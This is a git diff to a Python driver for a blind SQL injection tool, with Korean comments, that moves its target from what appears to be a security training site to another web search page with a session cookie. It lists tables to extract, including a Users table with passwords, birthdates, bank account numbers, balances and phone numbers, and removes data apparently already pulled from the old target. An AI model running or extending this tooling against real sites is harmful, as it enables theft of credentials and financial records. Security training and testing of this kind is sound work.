@@ -4,23 +4,29 @@ from get_infos import *
 
 
 #공격 대상 URL 및 초기 쿠키 설정 
-url = "http://elms1.skinfosec.co.kr:8082/community6/free"
+url = "https://www.rookiestock.com/search"
 cookies = {
-    "JSESSIONID":"2EC7D2BBF44EB7BE22C5B2BD5C3171BC"
+    "JSESSIONID":"201574BCB8517113C534D7F22982A392"
 }
 
 
 attack_query = ''
 page = attackData()
-query = attackQuerys()
+#query = attackQuerys()
 page.set_url(url)
 page.set_cookies(cookies)
 
 result = tableInfo()
-result.tables=['BOARD', 'COMM_FILE', 'COMM_MDI_FILE', 'MEMBER', 'ZIPCODE', 'ANSWER']
-result.columns={'BOARD': ['BOARD_ID', 'TITLE', 'CONTENT', 'VIEW_COUNT', 'REG_ACCT_ID', 'DEL_FL', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'BOARD_TYPE_CD'], 'COMM_FILE': ['FILE_ID', 'FILE_NM', 'FILE_PATH', 'ORG_FILE_NM', 'FILE_SIZE', 'FILE_TYPE_CD', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID'], 'COMM_MDI_FILE': ['MDI_FILE_ID', 'FILE_ID', 'MDI_TYPE_CD', 'MDI_ORDER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID', 'BOARD_ID'], 'MEMBER': ['ACCT_ID', 'LOGIN_ID', 'USER_NM', 'USER_TERMS_YN', 'PRIVACY_YN', 'EMAIL', 'PASS', 'ZIPCODE', 'ADDRESS1', 'ADDRESS2', 'REG_ACCT_ID', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'MAIL_CERTI_KEY', 'CERTI_YN', 'ADMIN_YN', 'PWDQ', 'PWDANS', 'PWDCNT', 'FSTPWD'], 'ZIPCODE': ['ZIPCODE', 'SIDO', 'GUGUN', 'DONG', 'BUNJI'], 'ANSWER': ['ANSWER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']}
-result.datas={'BOARD': {'BOARD_ID': [], 'TITLE': [], 'CONTENT': [], 'VIEW_COUNT': [], 'REG_ACCT_ID': [], 'DEL_FL': [], 'REG_DT': [], 'UDT_ACCT_ID': [], 'UDT_DT': [], 'BOARD_TYPE_CD': []}, 'COMM_FILE': {'FILE_ID': [], 'FILE_NM': [], 'FILE_PATH': [], 'ORG_FILE_NM': [], 'FILE_SIZE': [], 'FILE_TYPE_CD': [], 'REG_DT': [], 'REG_ACCT_ID': [], 'UDT_DT': [], 'UDT_ACCT_ID': []}, 'COMM_MDI_FILE': {'MDI_FILE_ID': [], 'FILE_ID': [], 'MDI_TYPE_CD': [], 'MDI_ORDER': [], 'REG_DT': [], 'REG_ACCT_ID': [], 'UDT_DT': [], 'UDT_ACCT_ID': [], 'BOARD_ID': []}, 'MEMBER': {'ACCT_ID': [], 'LOGIN_ID': [], 'USER_NM': [], 'USER_TERMS_YN': [], 'PRIVACY_YN': [], 'EMAIL': [], 'PASS': [], 'ZIPCODE': [], 'ADDRESS1': [], 'ADDRESS2': [], 'REG_ACCT_ID': [], 'REG_DT': [], 'UDT_ACCT_ID': [], 'UDT_DT': [], 'MAIL_CERTI_KEY': [], 'CERTI_YN': [], 'ADMIN_YN': [], 'PWDQ': [], 'PWDANS': [], 'PWDCNT': [], 'FSTPWD': []}, 'ZIPCODE': {'ZIPCODE': [], 'SIDO': [], 'GUGUN': [], 'DONG': [], 'BUNJI': []}, 'ANSWER': {'ANSWER': ['ant6'], 'REG_DT': ['03-JUL-19'], 'REG_ACCT_ID': ['U180623-00001'], 'UDT_DT': ['03-JUL-19'], 'UDT_ACCT_ID': ['U180623-00001']}}
+table_list=['Users','Board', 'Community', 'Notice', 'OrderStockHistory', 'Stock', 'StockHistory', 'Stock_Price', 'Transaction', 'Transfer_history', 'UserStock', 'file', 'notice', 'stock_index', 'user']
+for t in table_list:
+    result.append_table(t)
 
+user_column_list = ['USER_ID','USER_PW','USER_NM','ACCESS_LEVEL','USER_BIRTH','USER_ACCOUNT_NUMBER', 'USER_BANK','ACCOUNT_BALANCE', 'USER_AGENCY','USER_TELNO']
+
+
+
+for c in user_column_list:
+    result.append_column('Users',c)
 
 
 
@@ -31,17 +37,17 @@ print(page.send_post_request())
 #page.show
 
 #쿼리 테스트
-table_count_query = query.get_table_query('count')
-table_length_query = query.get_table_query('length',rnum=1)
-table_data_query = query.get_table_query('data',rnum=1)
+#table_count_query = query.get_table_query('count')
+#table_length_query = query.get_table_query('length',rnum=1)
+#table_data_query = query.get_table_query('data',rnum=1)
 
-column_count_query = query.get_column_query('count',table_name='MEMBER')
-column_length_query = query.get_column_query('length',table_name='ANSWER',rnum=1)
-column_data_query = query.get_column_query('data',table_name='ANSWER',rnum=1)
+#column_count_query = query.get_column_query('count',table_name='MEMBER')
+#column_length_query = query.get_column_query('length',table_name='ANSWER',rnum=1)
+#column_data_query = query.get_column_query('data',table_name='ANSWER',rnum=1)
 
-data_count_query = query.get_data_query('count',table_name='ANSWER',column_name='ANSWER')
-data_length_query = query.get_data_query('length',table_name='ANSWER',column_name='ANSWER',rnum=1)
-data_query = query.get_data_query('data',table_name='ANSWER',column_name='ANSWER',rnum=1)
+#data_count_query = query.get_data_query('count',table_name='ANSWER',column_name='ANSWER')
+#data_length_query = query.get_data_query('length',table_name='ANSWER',column_name='ANSWER',rnum=1)
+#data_query = query.get_data_query('data',table_name='ANSWER',column_name='ANSWER',rnum=1)
 
 #print(data_query)
 #binary_search(page,column_count_query)
@@ -130,6 +136,7 @@ while(state != 'q'):
         
         case '8':
             result.show_tables()
+
         case '9':
             print()
             result.show_columns()
@@ -146,10 +153,6 @@ while(state != 'q'):
         case _: 
             print("존재하지 않는 명령어")
         
-
-
     state= input("\n계속 실행을 원하시면 엔터를 눌러주세요... (exit=q)")
-
-    
 
 print("프로그램 종료")
